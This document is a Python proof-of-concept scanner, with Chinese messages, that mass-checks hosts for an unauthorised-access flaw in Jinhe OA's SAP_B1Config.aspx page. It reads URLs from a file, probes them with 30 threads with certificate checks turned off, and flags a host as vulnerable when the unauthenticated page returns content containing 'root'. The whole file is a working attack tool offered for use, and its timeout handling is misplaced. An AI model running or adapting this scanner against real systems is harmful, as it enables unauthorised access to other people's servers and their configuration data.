import requests
from multiprocessing.dummy import Pool
import argparse
requests.packages.urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="金和OA SAP_B1Config.aspx未授权访问漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for i in f.readlines():
                target = i.strip()
                if 'http' in i:
                    targets.append(target)
                else:
                    target = f"http://{i}"
                    targets.append(target)
            pool = Pool(30)
            pool.map(check, targets)
    except Exception as s:
        print('error 请输入-h查看帮助信息')
def check(target):
    url = f'{target}/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    response = requests.get(url=url, headers=headers, verify=False, timeout=10)
    try:
        if response.status_code == 200 and 'root' in response.text:
            print(f'存在漏洞 {url}')
        else:
             print(f'不存在漏洞  {url}')
    except Exception as e:
        print(f"[timeout] {url}")

if __name__ == '__main__':
    main()